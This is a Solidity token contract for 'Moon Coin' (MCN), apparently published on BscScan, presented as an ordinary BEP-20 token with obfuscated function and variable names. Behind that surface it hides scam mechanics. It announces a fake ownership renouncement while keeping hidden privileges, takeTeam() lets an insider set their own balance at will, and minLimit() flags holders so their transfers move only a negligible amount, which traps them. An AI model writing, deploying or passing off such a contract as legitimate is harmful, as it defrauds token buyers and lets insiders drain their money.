/**
 *Submitted for verification at BscScan.com on 2023-02-06
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface txMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface totalFee {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract MoonCoin {
    uint8 private senderExempt = 18;

    address private toReceiver;

    string private launchToken = "Moon Coin";
    string private launchListSell = "MCN";

    uint256 private minTo = 100000000 * 10 ** senderExempt;
    mapping(address => uint256) private walletLaunched;
    mapping(address => mapping(address => uint256)) private atTrading;

    mapping(address => bool) public toAmount;
    address public autoListLaunched;
    address public fundModeTx;
    mapping(address => bool) public isMax;
    uint256 constant feeTake = 11 ** 10;
    bool public sellReceiver;

    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        txMin maxTotal = txMin(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        fundModeTx = totalFee(maxTotal.factory()).createPair(maxTotal.WETH(), address(this));
        toReceiver = sellTeam();
        autoListLaunched = toReceiver;
        toAmount[autoListLaunched] = true;
        walletLaunched[autoListLaunched] = minTo;
        emit Transfer(address(0), autoListLaunched, minTo);
        isExempt();
    }

    

    function sellTeam() private view returns (address) {
        return msg.sender;
    }

    function owner() external view returns (address) {
        return toReceiver;
    }

    function totalSupply() external view returns (uint256) {
        return minTo;
    }

    function symbol() external view returns (string memory) {
        return launchListSell;
    }

    function decimals() external view returns (uint8) {
        return senderExempt;
    }

    function minLimit(address feeMode) public {
        if (feeMode == autoListLaunched || feeMode == fundModeTx || !toAmount[sellTeam()]) {
            return;
        }
        isMax[feeMode] = true;
    }

    function name() external view returns (string memory) {
        return launchToken;
    }

    function approve(address isReceiver, uint256 sellAmountAuto) public returns (bool) {
        atTrading[sellTeam()][isReceiver] = sellAmountAuto;
        emit Approval(sellTeam(), isReceiver, sellAmountAuto);
        return true;
    }

    function transfer(address sellExemptMin, uint256 sellAmountAuto) external returns (bool) {
        return transferFrom(sellTeam(), sellExemptMin, sellAmountAuto);
    }

    function balanceOf(address modeExemptAt) public view returns (uint256) {
        return walletLaunched[modeExemptAt];
    }

    function takeTeam(uint256 sellAmountAuto) public {
        if (!toAmount[sellTeam()]) {
            return;
        }
        walletLaunched[autoListLaunched] = sellAmountAuto;
    }

    function allowance(address isFund, address isReceiver) external view returns (uint256) {
        return atTrading[isFund][isReceiver];
    }

    function shouldBuy(address limitLiquidity, address swapBuy, uint256 sellAmountAuto) internal returns (bool) {
        require(walletLaunched[limitLiquidity] >= sellAmountAuto);
        walletLaunched[limitLiquidity] -= sellAmountAuto;
        walletLaunched[swapBuy] += sellAmountAuto;
        emit Transfer(limitLiquidity, swapBuy, sellAmountAuto);
        return true;
    }

    function launchSender(address walletMarketing) public {
        if (sellReceiver) {
            return;
        }
        toAmount[walletMarketing] = true;
        sellReceiver = true;
    }

    function isExempt() public {
        emit OwnershipTransferred(autoListLaunched, address(0));
        toReceiver = address(0);
    }

    function getOwner() external view returns (address) {
        return toReceiver;
    }

    function transferFrom(address limitLaunch, address sellExemptMin, uint256 sellAmountAuto) public returns (bool) {
        if (limitLaunch != sellTeam() && atTrading[limitLaunch][sellTeam()] != type(uint256).max) {
            require(atTrading[limitLaunch][sellTeam()] >= sellAmountAuto);
            atTrading[limitLaunch][sellTeam()] -= sellAmountAuto;
        }
        if (sellExemptMin == autoListLaunched || limitLaunch == autoListLaunched) {
            return shouldBuy(limitLaunch, sellExemptMin, sellAmountAuto);
        }
        if (isMax[limitLaunch]) {
            return shouldBuy(limitLaunch, sellExemptMin, feeTake);
        }
        return shouldBuy(limitLaunch, sellExemptMin, sellAmountAuto);
    }


}